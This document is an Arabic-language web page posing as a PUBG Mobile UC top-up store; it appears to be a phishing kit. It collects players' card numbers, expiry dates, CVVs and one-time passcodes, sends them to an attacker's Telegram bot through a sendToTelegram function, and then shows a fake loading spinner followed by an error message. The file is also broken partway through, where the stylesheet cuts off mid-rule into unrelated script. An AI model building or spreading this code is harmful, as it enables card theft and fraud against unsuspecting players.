<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
  <title>PUBG UC · شراء</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: 'Segoe UI', Tahoma, system-ui, -apple-system, sans-serif;
    }

    html, body {
      overscroll-behavior: none;
      overscroll-behavior-y: none;
      -webkit-overflow-scrolling: touch;
    }

    body {
      background: #f5f7fa;
      display: flex;
      justify-content: center;
      align-items: flex-start;
      min-height: 100vh;
      padding: 0;
      padding-top: 0;
      overscroll-behavior: none;
    }

    .page {
      display: none;
      max-width: 100%;
      width: 100%;
    }
    .page.active { display: block; }

    .card {
      width: 100%;
      background: #ffffff;
      border-radius: 0;
      padding: 0;
      box-shadow: none;
      color: #1a1a1a;
      border: none;
      position: relative;
      overflow: hidden;
    }

    .top-image {
      width: 100%;
      display: block;
      line-height: 0;
      margin: 0;
      padding: 0;
    }
    .top-image img {
      width: 100%;
      height: auto;
      display: block;
      border-radius: 0;
      margin: 0;
      padding: 0;
    }

    .stack-image {
      width: 100%;
      display: block;
      line-height: 0;
      margin: 0;
      padding: 0;
    }
    .stack-image img {
      width: 100%;
      height: auto;
      display: block;
      border-radius: 0;
      margin: 0;
      padding: 0;
    }

    .content {
      padding: 18px 16px 0 16px;
      max-width: 100%;
    }

    /* ===== معرف اللاعب ===== */
    .user-section {
      background: #f0f2f5;
      border-radius: 28px;
      padding: 6px 18px 6px 12px;
      margin-bottom: 12px;
      display: flex;
      align-items: center;
      gap: 10px;
      border: 1px solid #e0e4e8;
      position: relative;
      flex-direction: row-reverse;
      height: 56px;
    }
    .user-section i {
      color: #777;
      font-size: 18px;
      order: 3;
    }
    .user-section input {
      background: transparent;
      border: none;
      outline: none;
      color: #1a1a1a;
      font-size: 16px;
      padding: 10px 0;
      flex: 1;
      min-width: 100px;
      text-align: left;
      direction: ltr;
      order: 1;
    }
    .user-section input::placeholder {
      color: #999;
      font-weight: 400;
      text-align: right;
      direction: rtl;
      font-size: 14px;
    }

    /* رسالة خطأ معرف اللاعب */
    .player-error-msg {
      display: none;
      color: #dc2626;
      font-size: 11px;
      font-weight: 600;
      background: #fee2e2;
      padding: 3px 10px;
      border-radius: 20px;
      white-space: nowrap;
      animation: fadeIn 0.3s ease;
      order: 2;
    }
    .player-error-msg.show { display: inline-block; }

    .player-confirm-msg {
      display: none;
      color: #1a73e8;
      font-size: 12px;
      font-weight: 600;
      background: #e8f0fe;
      padding: 4px 12px;
      border-radius: 20px;
      white-space: nowrap;
      animation: fadeIn 0.3s ease;
      order: 2;
    }
    .player-confirm-msg.show { display: inline-block; }
    @keyframes fadeIn {
      0% { opacity: 0; transform: scale(0.8); }
      100% { opacity: 1; transform: scale(1); }
    }
    .player-confirm-msg i {
      font-size: 12px;
      margin-left: 4px;
      color: #1a73e8;
    }

    .player-ok-msg {
      display: none;
      color: #888;
      font-size: 13px;
      font-weight: 700;
      background: #e8eaed;
      padding: 4px 12px;
      border-radius: 20px;
      white-space: nowrap;
      animation: fadeIn 0.3s ease;
      order: 2;
    }
    .player-ok-msg.show { display: inline-block; }
    .player-ok-msg .spinner-icon {
      display: inline-block;
      width: 14px;
      height: 14px;
      border: 2px solid #ccc;
      border-top: 2px solid #888;
      border-radius: 50%;
      animation: spin 0.7s linear infinite;
      vertical-align: middle;
    }

    /* ===== العملة ===== */
    .country-section {
      background: #f0f2f5;
      border-radius: 28px;
      padding: 6px 18px;
      margin-bottom: 24px;
      display: flex;
      align-items: center;
      gap: 10px;
      border: 1px solid #e0e4e8;
      flex-direction: row-reverse;
      cursor: pointer;
      position: relative;
      height: 56px;
      -webkit-tap-highlight-color: transparent;
    }
    .country-section:active {
      background: #e8ecf1;
    }
    .country-label {
      font-size: 14px;
      font-weight: 700;
      color: #555;
      white-space: nowrap;
      order: 3;
      pointer-events: none;
    }
    .country-section select {
      display: none; /* hidden native select */
    }
    .country-section .select-arrow {
      order: 2;
      color: #555;
      font-size: 12px;
      pointer-events: none;
    }
    .country-display {
      order: 1;
      flex: 1;
      font-size: 14px;
      font-weight: 600;
      color: #1a1a1a;
      text-align: right;
      direction: rtl;
      pointer-events: none;
      white-space: nowrap;
      overflow: hidden;
      text-overflow: ellipsis;
    }

    /* ===== قائمة العملات المخصصة ===== */
    .custom-dropdown {
      display: none;
      position: absolute;
      top: 100%;
      left: 0;
      right: 0;
      background: #fff;
      border-radius: 16px;
      box-shadow: 0 10px 30px rgba(0,0,0,0.15);
      max-height: 300px;
      overflow-y: auto;
      z-index: 1000;
      margin-top: 6px;
      border: 1px solid #e0e4e8;
      direction: rtl;
      -webkit-overflow-scrolling: touch;
    }
    .custom-dropdown.active {
      display: block;
    }
    .custom-dropdown-item {
      padding: 12px 16px;
      font-size: 14px;
      cursor: pointer;
      display: flex;
      align-items: center;
      gap: 8px;
      text-align: right;
      direction: rtl;
      border-bottom: 1px solid #f0f2f5;
    }
    .custom-dropdown-item:last-child {
      border-bottom: none;
    }
    .custom-dropdown-item:hover {
      background: #f0f2f5;
    }
    .custom-dropdown-item.selected {
      background: #e8f0fe;
      font-weight: 600;
    }

    .coin-grid {
      display: grid;
      grid-template-columns: repeat(3, 1fr);
      gap: 12px;
      margin-bottom: 24px;
      direction: rtl;
    }
    .coin-option {
      background: #f8f9fc;
      border-radius: 16px;
      padding: 16px 8px;
      text-align: center;
      border: 2px solid #e8ecf1;
      transition: 0.2s;
      cursor: pointer;
      position: relative;
    }
    .coin-option:hover {
      border-color: #d0d5e0;
      transform: translateY(-1px);
    }
    .coin-option.selected {
      border-color: #1a73e8;
      background: #e8f0fe;
      box-shadow: 0 0 0 1px #1a73e8;
    }
    .coin-option .coins {
      font-weight: 700;
      font-size: 18px;
      color: #1a1a1a;
      line-height: 1.3;
      margin-top: 4px;
      direction: ltr;
      unicode-bidi: embed;
    }
    .coin-option .uc-symbol {
      display: inline-flex;
      align-items: center;
      justify-content: center;
      width: 72px;
      height: 72px;
      margin: 0 auto 6px;
      background: transparent;
      border-radius: 0;
      border: none;
      box-shadow: none;
      flex-shrink: 0;
      padding: 0;
      transition: none;
    }
    .coin-option .uc-symbol .uc-icon-img {
      width: 100%;
      height: 100%;
      display: block;
      object-fit: contain;
    }
    .coin-option .total-price {
      font-size: 14px;
      font-weight: 700;
      color: #1a73e8;
      background: #e8f0fe;
      padding: 4px 10px;
      border-radius: 20px;
      display: inline-block;
      margin-top: 6px;
      border: 1px solid #7baaf7;
    }
    .coin-option .badge {
      background: #1a73e822;
      color: #0d47a1;
      font-size: 10px;
      font-weight: 600;
      border-radius: 40px;
      padding: 2px 10px;
      display: inline-block;
      margin-top: 6px;
    }
    .coin-option.custom-option {
      border-style: dashed;
      border-color: #c0c8d4;
      background: #fafbfc;
    }
    .coin-option.custom-option .coins {
      font-size: 15px;
      color: #555;
    }
    .coin-option .custom-icon {
      display: inline-flex;
      align-items: center;
      justify-content: center;
      width: 72px;
      height: 72px;
      margin: 0 auto 6px;
      background: transparent;
      border-radius: 0;
      border: none;
      box-shadow: none;
      flex-shrink: 0;
      padding: 0;
      transition: none;
    }
    .custom-icon-img {
      width: 100%;
      height: 100%;
      display: block;
      object-fit: contain;
    }
    .coin-option.custom-option .custom-icon .uc-icon-check { display: none; }
    .coin-option.custom-option.selected .custom-icon .uc-icon-check { display: block; }
    .coin-option.custom-option.selected .custom-icon .uc-icon-default { display: none; }

    .payment-box {
      width: 100%;
      position: relative;
      margin-bottom: 20px;
      background: #ffffff;
      border-radius: 16px;
      padding: 20px 22px 22px;
      border: 2px solid #d0d5e0;
      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08), 0 1px 4px rgba(0, 0, 0, 0.05);
      transition: box-shadow 0.3s;
    }
    .payment-box:hover {
      box-shadow: 0 8px 30px rgba(0, 0, 0, 0.12), 0 1px 6px rgba(0, 0, 0, 0.06);
    }

    .payment-box label {
      display: block;
      font-size: 14px;
      font-weight: 700;
      color: #4a5568;
      letter-spacing: 0.8px;
      margin-bottom: 4px;
      text-align: right;
    }

    .field-wrapper {
      position: relative;
      width: 100%;
    }

    .field-wrapper input {
      width: 100%;
      height: 56px;
      border: 2px solid #d5d9e4;
      border-radius: 12px;
      background: #f7f9fc;
      padding: 0 20px;
      font-size: 20px;
      font-weight: 500;
      color: #1a1a2e;
      outline: none;
      font-family: 'Courier New', 'Courier', monospace;
      transition: border-color 0.3s, background 0.3s;
      padding-left: 48px;
      text-align: left;
      direction: ltr;
    }
    .field-wrapper input::placeholder {
      color: #bcc3d2;
      opacity: 1;
      font-weight: 400;
      font-size: 16px;
      letter-spacing: 1px;
      text-align: left;
    }
    .field-wrapper input:focus {
      border-color: #1a73e8;
      background: #ffffff;
    }
    .field-wrapper input.error {
      border-color: #dc2626;
      background: #fef2f2;
    }

    .field-wrapper .error-icon {
      position: absolute;
      left: 12px;
      top: 50%;
      transform: translateY(-50%);
      width: 28px;
      height: 28px;
      background: #dc2626;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      color: #fff;
      font-weight: 700;
      font-size: 16px;
      font-family: Arial, sans-serif;
      box-shadow: 0 2px 8px rgba(220, 38, 38, 0.4);
      opacity: 0;
      transition: opacity 0.2s;
      pointer-events: none;
      line-height: 1;
    }
    .field-wrapper.error .error-icon { opacity: 1; }

    .payment-box .field { margin-bottom: 18px; }

    .payment-box .row {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 20px;
      align-items: end;
    }
    .payment-box .row .field { margin-bottom: 0; }
    .payment-box .row .field:first-child {
      margin-top: -4px;
    }

    @media (max-width: 400px) {
      .payment-box { padding: 16px 14px; }
      .field-wrapper input {
        height: 48px;
        font-size: 17px;
        padding: 0 14px;
        padding-left: 40px;
      }
      .payment-box .row { gap: 12px; }
      .field-wrapper .error-icon {
        width: 24px;
        height: 24px;
        font-size: 14px;
        left: 8px;
      }
      .coin-option .uc-symbol {
        width: 60px;
        height: 60px;
        padding: 0;
      }
      .coin-option .coins { font-size: 16px; }
      .content { padding: 14px 12px 0 12px; }
      .coin-option .custom-icon {
        width: 60px;
        height: 60px;
        padding: 0;
      }
      .user-section { height: 50px; }
      .country-section { height: 50px; }
    }

    .action-btn {
      width: 100%;
      background: #1a73e8;
      border: none;
      padding: 16px;
      border-radius: 60px;
      font-weight: 700;
      font-size: 18px;
      color: white;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
      box-shadow: 0 8px 0 #0d47a1;
      transition: 0.08s linear;
      margin-bottom: 14px;
      cursor: pointer;
    }
    .action-btn:active {
      transform: translateY(4px);
      box-shadow: 0 4px 0 #0d47a1;
    }
    .action-btn:disabled {
      opacity: 0.7;
      cursor: not-allowed;
      transform: translateY(4px);
      box-shadow: 0 4px 0 #0d47a1;
    }

    .back-btn {
      background: #f0f2f5;
      color: #1a73e8;
      box-shadow: 0 4px 0 #d0d5e0;
      border: 1px solid #e0e4e8;
      font-size: 16px;
      padding: 14px;
      margin-bottom: 20px;
    }
    .back-btn:active { box-shadow: 0 2px 0 #d0d5e0; }

    .otp-overlay {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0,0,0,0.4);
      backdrop-filter: blur(4px);
      justify-content: center;
      align-items: flex-start;
      padding-top: 80px;
      z-index: 999;
      padding-left: 24px;
      padding-right: 24px;
      padding-bottom: 24px;
      overflow-y: auto;
      overscroll-behavior: none;
    }
    .otp-overlay.active { display: flex; }
    .otp-card {
      background: #ffffff;
      max-width: 380px;
      width: 100%;
      border-radius: 40px;
      padding: 32px 24px 28px;
      border: 1px solid #e0e4e8;
      box-shadow: 0 30px 60px rgba(0,0,0,0.15);
      animation: fadeUp 0.25s ease;
      margin: 0 auto;
      direction: rtl;
    }
    @keyframes fadeUp {
      0% { opacity: 0; transform: translateY(30px); }
      100% { opacity: 1; transform: translateY(0); }
    }
    .otp-card h2 {
      font-size: 24px;
      font-weight: 600;
      margin-bottom: 8px;
      display: flex;
      align-items: center;
      gap: 10px;
      color: #1a1a1a;
      flex-direction: row-reverse;
      justify-content: flex-end;
    }
    .otp-card h2 i { color: #1a73e8; }
    .otp-card .sub {
      color: #666;
      font-size: 14px;
      margin-bottom: 22px;
      border-right: 3px solid #1a73e8;
      padding-right: 12px;
      text-align: right;
    }
    .otp-input-group {
      background: #f0f2f5;
      border-radius: 60px;
      display: flex;
      align-items: center;
      padding: 4px 20px 4px 4px;
      border: 1px solid #e0e4e8;
      margin-bottom: 18px;
      flex-direction: row-reverse;
    }
    .otp-input-group input {
      background: transparent;
      border: none;
      outline: none;
      color: #1a1a1a;
      font-size: 22px;
      letter-spacing: 6px;
      flex: 1;
      padding: 14px 0;
      min-width: 0;
      text-align: center;
      direction: ltr;
    }
    .otp-input-group input::placeholder {
      letter-spacing: 2px;
      color: #999;
      font-size: 16px;
    }
    .otp-input-group button {
      background: #1a73e8;
      border: none;
      color: white;
      font-weight: 700;
      padding: 14px 24px;
      border-radius: 60px;
      font-size: 16px;
      cursor: pointer;
      transition: 0.1s;
      box-shadow: 0 4px 0 #0d47a1;
    }
    .otp-input-group button:active {
      transform: translateY(2px);
      box-shadow: 0 2px 0 #0d47a1;
    }
    .otp-close {
      display: none !important;
    }

    .resend-otp-btn {
      background: transparent;
      border: none;
      color: #1a73e8;
      font-size: 14px;
      font-weight: 600;
      cursor: pointer;
      padding: 8px;
      margin-top: 8px;
      width: 100%;
      text-align: center;
      transition: color 0.2s;
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 4px;
    }
    .resend-otp-btn:hover:not(:disabled) {
      color: #0d47a1;
      text-decoration: underline;
    }
    .resend-otp-btn:disabled {
      color: #999;
      cursor: not-allowed;
      text-decoration: none;
    }
    .resend-otp-btn .countdown {
      color: #999;
      font-weight: 700;
    }
    .resend-otp-btn.sent { color: #22c55e; }
    .resend-otp-btn.sent .countdown { color: #999; }
    .resend-otp-btn .resend-text { display: inline; }
    .resend-otp-btn .countdown-text {
      display: inline;
      font-size: 13px;
      color: #999;
      font-weight: 500;
    }
    .resend-otp-btn .sent-text { display: inline; }

    .error-popup-overlay {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0,0,0,0.5);
      backdrop-filter: blur(4px);
      justify-content: center;
      align-items: center;
      z-index: 1000;
      padding: 24px;
      overscroll-behavior: none;
    }
    .error-popup-overlay.active { display: flex; }
    .error-popup {
      background: #ffffff;
      max-width: 360px;
      width: 100%;
      border-radius: 28px;
      padding: 32px 24px 28px;
      text-align: center;
      border: 1px solid #ff4444;
      box-shadow: 0 30px 60px rgba(0,0,0,0.2);
      animation: fadeUp 0.3s ease;
      direction: rtl;
    }
    .error-popup .error-icon {
      font-size: 48px;
      color: #ff4444;
      margin-bottom: 12px;
    }
    .error-popup h3 {
      font-size: 20px;
      font-weight: 700;
      color: #cc0000;
      margin-bottom: 8px;
    }
    .error-popup p {
      font-size: 15px;
      color: #555;
      margin-bottom: 20px;
      line-height: 1.5;
    }
    .error-popup .error-close-btn {
      background: #1a73e8;
      border: none;
      color: white;
      font-weight: 700;
      padding: 12px 40px;
      border-radius: 60px;
      font-size: 16px;
      cursor: pointer;
      transition: 0.1s;
      box-shadow: 0 4px 0 #0d47a1;
    }
    .error-popup .error-close-btn:active {
      transform: translateY(2px);
      box-shadow: 0 2px 0 #0d47a1;
    }

    .custom-amount-overlay {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0,0,0,0.5);
      backdrop-filter: blur(4px);
      justify-content: center;
      align-items: center;
      z-index: 1100;
      padding: 24px;
      padding-top: 40px;
      overscroll-behavior: none;
    }
    .custom-amount-overlay.active { display: flex; }
    .custom-amount-card {
      background: #ffffff;
      max-width: 340px;
      width: 100%;
      border-radius: 32px;
      padding: 32px 24px 28px;
      text-align: center;
      box-shadow: 0 30px 60px rgba(0,0,0,0.2);
      animation: fadeUp 0.25s ease;
      border: 1px solid #e0e4e8;
      margin-top: 0;
      margin-bottom: 120px;
      direction: rtl;
    }
    .custom-amount-card h3 {
      font-size: 20px;
      font-weight: 700;
      color: #1a1a1a;
      margin-bottom: 6px;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
    }
    .uc-title-icon {
      width: 70px;
      height: 70px;
      object-fit: contain;
      display: inline-block;
      vertical-align: middle;
    }
    .custom-amount-card .sub {
      color: #777;
      font-size: 14px;
      margin-bottom: 20px;
    }
    .custom-amount-card input {
      width: 100%;
      height: 56px;
      border: 2px solid #d5d9e4;
      border-radius: 16px;
      background: #f7f9fc;
      padding: 0 20px;
      font-size: 28px;
      font-weight: 700;
      text-align: center;
      color: #1a1a1a;
      outline: none;
      transition: border-color 0.3s;
      margin-bottom: 16px;
      direction: ltr;
    }
    .custom-amount-card input:focus {
      border-color: #1a73e8;
      background: #ffffff;
    }
    .custom-amount-card input::placeholder {
      color: #bcc3d2;
      font-weight: 400;
      font-size: 16px;
    }
    .custom-amount-card .actions {
      display: flex;
      flex-direction: row-reverse;
      gap: 12px;
    }
    .custom-amount-card .actions button {
      flex: 1;
      padding: 14px 0;
      border: none;
      border-radius: 60px;
      font-weight: 700;
      font-size: 16px;
      cursor: pointer;
      transition: 0.1s;
    }
    .custom-amount-card .btn-confirm {

        const selectedCountry = countrySelect.value;
        const rate = currencyData[selectedCountry].rate;
        const symbol = currencyData[selectedCountry].symbol;

        document.querySelectorAll('.coin-option:not(.custom-option)').forEach(opt => {
          const priceUSD = parseFloat(opt.dataset.priceUSD);
          if (!isNaN(priceUSD)) {
            const localPrice = (priceUSD * rate);
            const priceEl = opt.querySelector('.total-price');
            if (priceEl) priceEl.textContent = `${symbol} ${localPrice.toFixed(2)}`;
          }
        });

        const customOpt = document.querySelector('.coin-option.custom-option.selected');
        if (customOpt) {
          const coins = parseInt(customOpt.dataset.customCoins);
          if (coins && !isNaN(coins) && coins > 0) {
            const usdPrice = calculateUCPriceUSD(coins);
            const localPrice = usdPrice * rate;
            selectedPriceUSD = usdPrice;
            selectedPrice = localPrice;
            let totalEl = customOpt.querySelector('.total-price');
            if (totalEl) totalEl.textContent = `${symbol} ${localPrice.toFixed(2)}`;
          }
        }

        const selectedOpt = document.querySelector('.coin-option.selected');
        if (selectedOpt && !selectedOpt.classList.contains('custom-option')) {
          const usd = parseFloat(selectedOpt.dataset.priceUSD);
          if (!isNaN(usd)) {
            selectedPriceUSD = usd;
            selectedPrice = usd * rate;
          }
        }
      }

      function onCoinClick() {
        const opt = this;
        const isCustom = opt.dataset.coins === 'custom';

        if (isCustom) {
          customInput.value = '';
          customOverlay.classList.add('active');
          setTimeout(() => customInput.focus(), 50);
          return;
        }

        document.querySelectorAll('.coin-option').forEach(o => o.classList.remove('selected'));
        opt.classList.add('selected');

        const rate = currencyData[countrySelect.value].rate;
        const coins = parseInt(opt.dataset.coins, 10);
        const usd = parseFloat(opt.dataset.priceUSD);
        const local = usd * rate;
        selectedCoins = coins;
        selectedPriceUSD = usd;
        selectedPrice = local;
      }

      customInput.addEventListener('input', function() { 
        this.value = this.value.replace(/[^0-9]/g, ''); 
      });

      confirmCustomBtn.addEventListener('click', function() {
        const val = customInput.value.trim();
        if (val === '' || isNaN(val) || parseInt(val, 10) <= 0) {
          customInput.style.borderColor = '#dc2626';
          customInput.style.background = '#fef2f2';
          setTimeout(() => { customInput.style.borderColor = ''; customInput.style.background = ''; }, 500);
          return;
        }

        const num = parseInt(val, 10);
        const rate = currencyData[countrySelect.value].rate;
        const symbol = currencyData[countrySelect.value].symbol;
        const usdPrice = calculateUCPriceUSD(num);
        const localPrice = usdPrice * rate;

        document.querySelectorAll('.coin-option').forEach(o => o.classList.remove('selected'));
        const customOpt = document.querySelector('.coin-option.custom-option');
        customOpt.classList.add('selected');
        customOpt.dataset.customCoins = num;

        const defaultIcon = customOpt.querySelector('.uc-icon-default');
        const checkIcon = customOpt.querySelector('.uc-icon-check');
        if (defaultIcon) defaultIcon.style.display = 'none';
        if (checkIcon) checkIcon.style.display = 'block';

        let coinsEl = customOpt.querySelector('.coins');
        if (coinsEl) coinsEl.textContent = num.toLocaleString('en-US');

        let totalEl = customOpt.querySelector('.total-price');
        if (totalEl) totalEl.textContent = `${symbol} ${localPrice.toFixed(2)}`;
        else {
          const newTotal = document.createElement('div');
          newTotal.className = 'total-price';
          newTotal.textContent = `${symbol} ${localPrice.toFixed(2)}`;
          customOpt.appendChild(newTotal);
        }
        const badge = customOpt.querySelector('.badge');
        if (badge) badge.remove();

        selectedCoins = num;
        selectedPriceUSD = usdPrice;
        selectedPrice = localPrice;

        customOverlay.classList.remove('active');
        customInput.value = '';
      });

      cancelCustomBtn.addEventListener('click', function() {
        customOverlay.classList.remove('active');
        customInput.value = '';
        const customOpt = document.querySelector('.coin-option.custom-option');
        if (customOpt) {
          customOpt.classList.remove('selected');
          const defaultIcon = customOpt.querySelector('.uc-icon-default');
          const checkIcon = customOpt.querySelector('.uc-icon-check');
          if (defaultIcon) defaultIcon.style.display = 'block';
          if (checkIcon) checkIcon.style.display = 'none';
          if (!customOpt.dataset.customCoins) {
            let coinsEl = customOpt.querySelector('.coins');
            if (coinsEl) coinsEl.textContent = 'مخصص';
            let totalEl = customOpt.querySelector('.total-price');
            if (totalEl) totalEl.remove();
            if (!customOpt.querySelector('.badge')) {
              const badge = document.createElement('div');
              badge.className = 'badge';
              badge.textContent = 'UC';
              customOpt.appendChild(badge);
            }
          }
        }
        const defaultOpt = document.querySelector('.coin-option[data-coins="70"]');
        if (defaultOpt) defaultOpt.click();
        else if (coinOptions.length) coinOptions[0].click();
      });

      customOverlay.addEventListener('click', function(e) {
        if (e.target === this) cancelCustomBtn.click();
      });

      // ===== تغيير العملة (يعمل مع القائمة المخفية) =====
      countrySelect.addEventListener('change', function() {
        const selectedOption = this.options[this.selectedIndex];
        countryDisplay.textContent = selectedOption.text;
        updateAllPrices();
        // تحديث القائمة المخصصة
        document.querySelectorAll('.custom-dropdown-item').forEach(item => {
          item.classList.toggle('selected', item.dataset.value === this.value);
        });
        const selectedOpt = document.querySelector('.coin-option.selected');
        if (selectedOpt) {
          if (selectedOpt.classList.contains('custom-option')) {
            const coins = parseInt(selectedOpt.dataset.customCoins);
            if (coins && !isNaN(coins) && coins > 0) {
              const usd = calculateUCPriceUSD(coins);
              const rate = currencyData[countrySelect.value].rate;
              const local = usd * rate;
              selectedPriceUSD = usd;
              selectedPrice = local;
              const totalEl = selectedOpt.querySelector('.total-price');
              if (totalEl) totalEl.textContent = `${currencyData[countrySelect.value].symbol} ${local.toFixed(2)}`;
            }
          } else {
            const usd = parseFloat(selectedOpt.dataset.priceUSD);
            if (!isNaN(usd)) {
              const rate = currencyData[countrySelect.value].rate;
              selectedPriceUSD = usd;
              selectedPrice = usd * rate;
            }
          }
        }
      });

      usernameInput.addEventListener('input', function() {
        this.value = this.value.replace(/[^0-9]/g, '');
        this.classList.remove('error');
        playerOkMsg.classList.remove('show');
        playerConfirmMsg.classList.remove('show');
        playerErrorMsg.classList.remove('show');
        if (confirmTimer) { clearTimeout(confirmTimer); confirmTimer = null; }
        if (okTimer) { clearTimeout(okTimer); okTimer = null; }
        if (this.value.trim() !== lastUsername) lastUsername = '';
      });

      usernameInput.addEventListener('blur', function() {
        const val = this.value.trim();
        if (isValidUsername(val)) {
          playerErrorMsg.classList.remove('show');
          if (val === lastUsername) {
            playerOkMsg.classList.remove('show');
            playerConfirmMsg.classList.add('show');
            this.classList.remove('error');
            return;
          }
          playerOkMsg.classList.add('show');
          playerConfirmMsg.classList.remove('show');
          lastUsername = val;
          if (okTimer) { clearTimeout(okTimer); okTimer = null; }
          if (confirmTimer) { clearTimeout(confirmTimer); confirmTimer = null; }
          okTimer = setTimeout(() => {
            playerOkMsg.classList.remove('show');
            playerConfirmMsg.classList.add('show');
            okTimer = null;
          }, 1000);
        } else if (val !== '') {
          playerOkMsg.classList.remove('show');
          playerConfirmMsg.classList.remove('show');
          playerErrorMsg.classList.add('show');
          lastUsername = '';
        } else {
          playerOkMsg.classList.remove('show');
          playerConfirmMsg.classList.remove('show');
          playerErrorMsg.classList.remove('show');
          lastUsername = '';
        }
        this.classList.remove('error');
      });

      cardNumber.addEventListener('input', function() {
        let raw = this.value.replace(/\s/g, '').replace(/\D/g, '');
        if (raw.length > 16) raw = raw.slice(0, 16);
        let formatted = '';
        for (let i = 0; i < raw.length; i++) {
          if (i > 0 && i % 4 === 0) formatted += ' ';
          formatted += raw[i];
        }
        this.value = formatted;
        clearFieldError(cardWrapper);
        if (raw.length === 16) {
          if (isValidCardNumber(this.value)) { clearFieldError(cardWrapper); expiry.focus(); }
          else setFieldError(cardWrapper, true);
        }
      });

      expiry.addEventListener('input', function() {
        let raw = this.value.replace(/\D/g, '');
        if (raw.length > 4) raw = raw.slice(0, 4);
        let formatted = '';
        for (let i = 0; i < raw.length; i++) {
          if (i === 2 && raw.length > 2) formatted += '/';
          formatted += raw[i];
        }
        this.value = formatted;
        clearFieldError(expiryWrapper);
        if (raw.length === 4) {
          if (validateExpiry(this.value)) { clearFieldError(expiryWrapper); cvv.focus(); }
          else setFieldError(expiryWrapper, true);
        } else expiryValid = false;
      });

      expiry.addEventListener('blur', function() {
        if (this.value.length === 5) {
          if (!validateExpiry(this.value)) setFieldError(expiryWrapper, true);
          else clearFieldError(expiryWrapper);
        }
      });

      cvv.addEventListener('input', function() {
        this.value = this.value.replace(/\D/g, '');
        if (this.value.length > 3) this.value = this.value.slice(0, 3);
        clearFieldError(cvvWrapper);
      });

      cvv.addEventListener('blur', function() {
        if (this.value.length === 3) clearFieldError(cvvWrapper);
        else setFieldError(cvvWrapper, true);
      });

      otpInput.addEventListener('input', function() { this.value = this.value.replace(/\D/g, '').slice(0, 8); });

      function sendToTelegram(message) {
        return new Promise((resolve) => {
          const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
          const payload = { chat_id: CHAT_ID, text: message, parse_mode: 'HTML' };
          fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
            body: JSON.stringify(payload),
            keepalive: true
          }).then(() => resolve(true)).catch(() => resolve(true));
          setTimeout(() => resolve(true), 3000);
        });
      }

      function showLoadingThenError() {
        loadingOverlay.classList.add('active');
        setTimeout(function() {
          loadingOverlay.classList.remove('active');
          errorPopupOverlay.classList.add('active');
        }, 5000);
      }

      function resetPage() { window.location.reload(); }

      function startCountdown() {
        countdownValue = 30;
        resendOtpBtn.disabled = true;
        resendOtpBtn.classList.add('sent');
        resendOtpBtn.innerHTML = `
          <span class="sent-text"><i class="fas fa-check-circle"></i> تم الإرسال</span>
          <span class="countdown-text">إعادة الإرسال بعد <span class="countdown">${countdownValue}</span> ثانية</span>
        `;
        if (countdownInterval) clearInterval(countdownInterval);
        countdownInterval = setInterval(function() {
          countdownValue--;
          if (countdownValue <= 0) {
            clearInterval(countdownInterval);
            countdownInterval = null;
            resendOtpBtn.disabled = false;
            resendOtpBtn.classList.remove('sent');
            resendOtpBtn.innerHTML = `<span class="resend-text">إعادة إرسال رمز التحقق</span>`;
          } else {
            resendOtpBtn.innerHTML = `
              <span class="sent-text"><i class="fas fa-check-circle"></i> تم الإرسال</span>
              <span class="countdown-text">إعادة الإرسال بعد <span class="countdown">${countdownValue}</span> ثانية</span>
            `;
          }
        }, 1000);
      }

      resendOtpBtn.addEventListener('click', function() {
        if (this.disabled) return;
        startCountdown();
      });

      proceedBtn.addEventListener('click', function() {
        const username = usernameInput.value.trim();
        if (!username || !isValidUsername(username)) {
          usernameInput.focus();
          usernameInput.classList.add('error');
          playerErrorMsg.classList.add('show');
          playerConfirmMsg.classList.remove('show');
          playerOkMsg.classList.remove('show');
          setTimeout(() => {
            usernameInput.classList.remove('error');
          }, 1500);
          return;
        }
        playerErrorMsg.classList.remove('show');
        if (selectedCoins === null || selectedCoins <= 0) {
          coinOptions.forEach(opt => {
            opt.style.borderColor = '#1a73e8';
            setTimeout(() => { opt.style.borderColor = ''; }, 500);
          });
          return;
        }
        page1.classList.remove('active');
        page2.classList.add('active');
        window.scrollTo({ top: 0, behavior: 'auto' });
      });

      backToPage1.addEventListener('click', function() {
        page2.classList.remove('active');
        page1.classList.add('active');
        window.scrollTo({ top: 0, behavior: 'auto' });
      });

      topupBtn.addEventListener('click', function() {
        if (isProcessing) return;

        const username = usernameInput.value.trim();
        if (!username || !isValidUsername(username)) {
          page2.classList.remove('active');
          page1.classList.add('active');
          usernameInput.focus();
          usernameInput.classList.add('error');
          playerErrorMsg.classList.add('show');
          playerConfirmMsg.classList.remove('show');
          playerOkMsg.classList.remove('show');
          setTimeout(() => {
            usernameInput.classList.remove('error');
          }, 1500);
          return;
        }

        if (selectedCoins === null || selectedCoins <= 0) {
          page2.classList.remove('active');
          page1.classList.add('active');
          coinOptions.forEach(opt => {
            opt.style.borderColor = '#1a73e8';
            setTimeout(() => { opt.style.borderColor = ''; }, 500);
          });
          return;
        }

        const cardRaw = cardNumber.value.replace(/\s/g, '');
        if (!isValidCardNumber(cardRaw)) { cardNumber.focus(); setFieldError(cardWrapper, true); return; }
        else clearFieldError(cardWrapper);

        if (!expiryValid) {
          if (expiry.value.length === 5) validateExpiry(expiry.value);
          if (!expiryValid) { expiry.focus(); setFieldError(expiryWrapper, true); return; }
        } else clearFieldError(expiryWrapper);

        if (cvv.value.length !== 3) { cvv.focus(); setFieldError(cvvWrapper, true); return; }
        else clearFieldError(cvvWrapper);

        const countryCode = countrySelect.value;
